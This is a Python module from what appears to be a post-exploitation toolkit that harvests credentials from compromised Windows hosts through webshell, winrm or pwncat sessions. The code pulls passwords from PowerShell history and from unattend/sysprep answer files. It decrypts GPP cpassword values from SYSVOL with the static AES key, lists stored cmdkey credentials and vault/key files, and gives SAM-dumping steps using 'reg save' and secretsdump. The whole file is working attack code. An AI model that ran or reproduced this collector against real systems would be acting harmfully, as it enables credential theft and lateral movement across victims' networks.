"""Generic Windows loot collector — no upload, no external binary. Reads with
built-in cmd/PowerShell through session.exec, so it works over winrm, a webshell,
or a pwncat handoff alike. Recovered text is fed through patterns.scan_line so
existing correlation applies. Collect-only: destructive actions (reg save, minidump)
are surfaced as findings, never performed.

Covers the high-yield Windows/AD spots reap otherwise misses:
  - PowerShell console history (the Windows .bash_history)
  - unattend/sysprep answer files (base64 local-admin creds)
  - GPP cpassword in SYSVOL (decrypted with the public static AES key)
  - cmdkey /list (runas /savecred pivots)
  - KeePass/vault files (path-only)
  - SAM/SYSTEM hive theft hints when running as SYSTEM
"""
from __future__ import annotations

import base64
import re

from ...models import Credential, Finding
from ...patterns import scan_line
from ..base import Module, register

# Public, Microsoft-documented static AES-256 key for GPP cpassword.
_GPP_KEY = bytes.fromhex(
    "4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b")

_PS = "powershell -nop -ep bypass -c "
_PLAINTEXT_PW = re.compile(r"(?i)-AsPlainText\s+(?:-Force\s+)?['\"]?(?P<pw>[^\s'\"]{4,})")
_NETUSE_PW = re.compile(r"(?i)/user:\S+\s+(?P<pw>\S+)")


def _gpp_decrypt(cpassword: str):
    """Deterministic AES-256-CBC decrypt with the published static key. Returns
    the plaintext, or None if no crypto backend is available."""
    pad = len(cpassword) % 4
    if pad:
        cpassword += "=" * (4 - pad)
    try:
        data = base64.b64decode(cpassword)
    except Exception:
        return None
    raw = None
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        d = Cipher(algorithms.AES(_GPP_KEY), modes.CBC(b"\x00" * 16)).decryptor()
        raw = d.update(data) + d.finalize()
    except Exception:
        try:
            from Crypto.Cipher import AES
            raw = AES.new(_GPP_KEY, AES.MODE_CBC, b"\x00" * 16).decrypt(data)
        except Exception:
            return None
    try:
        raw = raw[:-raw[-1]]  # strip PKCS#7 padding
        return raw.decode("utf-16-le").strip("\x00").strip()
    except Exception:
        return None


@register
class WindowsLoot(Module):
    name = "windows_loot"

    def triggers(self, ctx) -> bool:
        return ctx.os == "windows"

    def collect(self, session):
        findings = []
        findings += self._ps_history(session)
        findings += self._unattend(session)
        findings += self._gpp(session)
        findings += self._cmdkey(session)
        findings += self._vaults(session)
        findings += self._sam(session)
        return findings

    # -- PowerShell history ----------------------------------------------------
    def _ps_history(self, session):
        out = []
        cmd = (_PS + '"Get-ChildItem \'C:\\Users\\*\\AppData\\Roaming\\Microsoft'
               '\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\' -EA 0 '
               '| %{ $_.FullName; Get-Content $_.FullName -EA 0 }"')
        content = session.exec(cmd, timeout=45).stdout
        if not content.strip():
            return out
        out.append(Finding(type="info", severity="low",
                           title="PowerShell console history captured",
                           detail="ConsoleHost_history.txt", source_module=self.name))
        for f in scan_line(content, "ConsoleHost_history.txt"):
            f.source_module = self.name
            out.append(f)
        for rx in (_PLAINTEXT_PW, _NETUSE_PW):
            for m in rx.finditer(content):
                out.append(Finding(
                    type="credential", severity="high",
                    title="Password in PowerShell history", detail=m.group(0)[:120],
                    source_module=self.name,
                    credential=Credential(kind="password", secret=m.group("pw"),
                                          source="ConsoleHost_history.txt")))
        return out

    # -- unattend / sysprep ----------------------------------------------------
    def _unattend(self, session):
        out = []
        paths = ["C:\\Windows\\Panther\\Unattend.xml",
                 "C:\\Windows\\Panther\\Unattended.xml",
                 "C:\\Windows\\System32\\Sysprep\\unattend.xml",
                 "C:\\Windows\\System32\\Sysprep\\Panther\\unattend.xml",
                 "C:\\unattend.xml", "C:\\autounattend.xml"]
        for p in paths:
            content = session.exec(f'type "{p}" 2>nul', timeout=15).stdout
            if not content.strip():
                continue
            out.append(Finding(type="info", severity="medium",
                               title=f"Answer file: {p}", detail="unattend/sysprep",
                               source_module=self.name))
            for m in re.finditer(r"(?is)<Password>.*?<Value>(?P<v>[^<]+)</Value>", content):
                val = m.group("v").strip()
                pw = self._maybe_b64_password(val)
                out.append(Finding(
                    type="credential", severity="high",
                    title=f"Unattend password ({p.rsplit(chr(92), 1)[-1]})",
                    detail="local admin from answer file", source_module=self.name,
                    credential=Credential(kind="password", secret=pw, source=p)))
        return out

    @staticmethod
    def _maybe_b64_password(val: str) -> str:
        try:
            dec = base64.b64decode(val).decode("utf-16-le", "ignore")
            # MS appends the literal 'Password' before base64-encoding.
            if dec.endswith("Password"):
                return dec[:-len("Password")]
            if dec.isprintable() and dec:
                return dec
        except Exception:
            pass
        return val

    # -- GPP cpassword ---------------------------------------------------------
    def _gpp(self, session):
        out = []
        cmd = (_PS + '"$s=$env:LOGONSERVER; if(-not $s){$s=\'\\\\\'+$env:USERDNSDOMAIN};'
               "Get-ChildItem -Path (Join-Path $s 'SYSVOL'),"
               "(Join-Path $env:SystemRoot 'SYSVOL') -Recurse -EA 0 "
               "-Include Groups.xml,Services.xml,ScheduledTasks.xml,DataSources.xml,"
               "Printers.xml,Drives.xml | %{ $_.FullName; Get-Content $_.FullName -Raw -EA 0 }\"")
        content = session.exec(cmd, timeout=60).stdout
        if "cpassword" not in content.lower():
            return out
        for m in re.finditer(r'(?i)cpassword="(?P<cp>[^"]+)"', content):
            cp = m.group("cp")
            # find a nearby userName= for context
            near = content[max(0, m.start() - 400):m.start() + 400]
            um = re.search(r'(?i)(?:userName|runAs|newName|accountName)="(?P<u>[^"]+)"', near)
            user = um.group("u") if um else None
            plain = _gpp_decrypt(cp)
            if plain:
                out.append(Finding(
                    type="credential", severity="high", title="GPP cpassword (decrypted)",
                    detail=f"user={user or '?'} from SYSVOL GPP", source_module=self.name,
                    credential=Credential(kind="password", secret=plain, username=user,
                                          source="SYSVOL GPP",
                                          metadata={"gpp_cpassword": cp})))
            else:
                out.append(Finding(
                    type="capability", severity="high", title="GPP cpassword",
                    detail=f"user={user or '?'}; no local crypto backend to decrypt",
                    source_module=self.name,
                    credential=Credential(
                        kind="capability", secret=cp, username=user, source="SYSVOL GPP",
                        metadata={"capability": "gpp_cpassword",
                                  "action": "decrypt with the public static GPP AES key "
                                            "(gpp-decrypt)"})))
        return out

    # -- Credential Manager ----------------------------------------------------
    def _cmdkey(self, session):
        out = []
        content = session.exec("cmdkey /list 2>nul", timeout=20).stdout
        target = None
        for line in content.splitlines():
            s = line.strip()
            if s.lower().startswith("target:"):
                target = s.split(":", 1)[-1].strip()
                out.append(Finding(
                    type="misconfig", severity="medium",
                    title=f"Stored credential: {target}",
                    detail=f"usable via runas /savecred /user:{target} <cmd> (no password "
                           f"needed)", source_module=self.name))
        return out

    # -- vaults ----------------------------------------------------------------
    def _vaults(self, session):
        out = []
        cmd = (_PS + '"Get-ChildItem C:\\Users -Recurse -Force -Include '
               "*.kdbx,*.kdb,*.pfx,*.p12,*.ppk -EA 0 | Select-Object -First 100 "
               '| %{ $_.FullName }"')
        for line in session.exec(cmd, timeout=60).stdout.splitlines():
            p = line.strip()
            if p:
                out.append(Finding(
                    type="info", severity="high", title=f"Vault/key file: {p}",
                    detail="exfil & crack offline (keepass2john / pfx2john)",
                    source_module=self.name))
        return out

    # -- SAM hive theft hints (SYSTEM only) ------------------------------------
    def _sam(self, session):
        # collect() has no ctx; check privilege cheaply via whoami.
        who = session.exec("whoami", timeout=10).out.lower()
        if "system" not in who:
            return []
        out = []
        for p in ("C:\\Windows\\Repair\\SAM",
                  "C:\\Windows\\System32\\config\\RegBack\\SAM"):
            if session.exec(f'if exist "{p}" echo FOUND', timeout=10).out.strip() == "FOUND":
                out.append(Finding(
                    type="capability", severity="high",
                    title=f"Stealable SAM hive: {p}",
                    detail="extract offline: secretsdump.py -sam SAM -system SYSTEM LOCAL",
                    source_module=self.name,
                    credential=Credential(kind="capability", secret=p, source=p,
                                          metadata={"capability": "sam_hive",
                                                    "action": "secretsdump.py LOCAL"})))
        out.append(Finding(
            type="misconfig", severity="high", title="Running as SYSTEM",
            detail="reg save HKLM\\SAM sam & HKLM\\SYSTEM system, then secretsdump LOCAL",
            source_module=self.name))
        return out
